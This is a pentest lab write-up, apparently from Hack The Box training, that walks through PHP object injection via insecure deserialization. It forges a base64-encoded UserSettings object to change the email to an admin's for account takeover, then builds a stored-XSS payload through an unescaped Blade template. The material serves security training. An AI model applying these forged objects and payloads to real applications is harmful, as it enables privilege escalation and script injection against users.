This paragraph takes care of Object injection in PHP code via insecure deserialization. This particular type of injection aims to "change" part of the values in order to gain PE.
An example would be promoting our user from user to admin...

# Attack scenario
Same here we have the source code of the application(Whitebox) and we identified the point where the serialization/de-serialization takes place.
But we have to identify how can we can use this to perform a PE.

1)Checking under **/Helper/UserSettings.php** we can see that we have 4 different values that might be handled via serialization:

```
namespace App\Helpers;
class UserSettings {
    private $Name;
    private $Email;
    private $Password;
    private $ProfilePic;
```

2)Setup the local test environment and copy the **UserSettings.php** locally, and create a custom serializer.php that encodes the string as:

```
<?php
include('UserSettings.php');
echo base64_encode(serialize(new \App\Helpers\UserSettings('pentest', 'attacker@htbank.com', '$2y$10$u5o6u2EbjOmobQjVtu87QO8ZwQsDd2zzoqjwS0.5zuPr3hqk9wfda', 'default.jpg')));
?>
```

```
┌──(aleksandar㉿DESKTOP-1KSM320)-[~/Downloads/LAB]
└─$ php Serializer.php                                                                                                                                                                                                                                       
TzoyNDoiQXBwXEhlbHBlcnNcVXNlclNldHRpbmdzIjo0OntzOjMwOiIAQXBwXEhlbHBlcnNcVXNlclNldHRpbmdzAE5hbWUiO3M6NzoieW92ZWNpbyI7czozMToiAEFwcFxIZWxwZXJzXFVzZXJTZXR0aW5ncwBFbWFpbCI7czoxNjoiYWRtaW5AaHRiYW5rLmNvbSI7czozNDoiAEFwcFxIZWxwZXJzXFVzZXJTZXR0aW5ncwBQYXNzd29yZCI7czo2MDoiJDJ5JDEwJHU1bzZ1MkViak9tb2JRalZ0dTg3UU84WndRc0RkMnp6b3Fqd1MwLjV6dVByM2hxazl3ZmRhIjtzOjM2OiIAQXBwXEhlbHBlcnNcVXNlclNldHRpbmdzAFByb2ZpbGVQaWMiO3M6MTE6ImRlZmF1bHQuanBnIjt9
```

3)Now that we have the string we could test locally to decrypt it by creating a **Deserializer.php**:

```
<?php
include('UserSettings.php');
$userSettings = unserialize(base64_decode($argv[1]));
print("Deserialized string is: \r\n");
print_r($userSettings);
?>

php Deserializer.php 'TzoyNDoiQXBwXEhlbHBlcnNcVXNlcl<snip>'
Deserialized string is: 
App\Helpers\UserSettings Object
(
    [Name:App\Helpers\UserSettings:private] => yovecio
    [Email:App\Helpers\UserSettings:private] => admin@htbank.com
    [Password:App\Helpers\UserSettings:private] => $2y$10$u5o6u2EbjOmobQjVtu87QO8ZwQsDd2zzoqjwS0.5zuPr3hqk9wfda
    [ProfilePic:App\Helpers\UserSettings:private] => default.jpg
)

```

4)Lastly tamper your **Serialzier.php** so for example you get the email to match admin@htbank.com and send via pentester session for a username takeover...


# EXTRA:
Seems like the Username field under **/settings** is reflected without a proper sanitization which means it is vulnerable to XSS.

## Code fragment
```
yovecio@htb[/htb]$ grep -nr "Imported settings for '" .
./app/Http/Controllers/HTController.php:135: Session::flash('ie-message', "Imported settings for '" . $userSettings->getName() . "'");

yovecio@htb[/htb]$ grep -nr 'ie-message' .
...
./resources/views/settings.blade.php:53: <p class="text-success">{!! Session::get('ie-message') !!}</p>
...

```

This mean we can generate a name that contains a XSS and upon visit will execute some JS code on the victim browser:

```
echo base64_encode(serialize(new \App\Helpers\UserSettings('<script>alert(1)</script>', 'attacker@htbank.com', '$2y$10$u5o6u2EbjOmobQjVtu87QO8ZwQsDd2zzoqjwS0.5zuPr3hqk9wfda', 'default.jpg')));
```
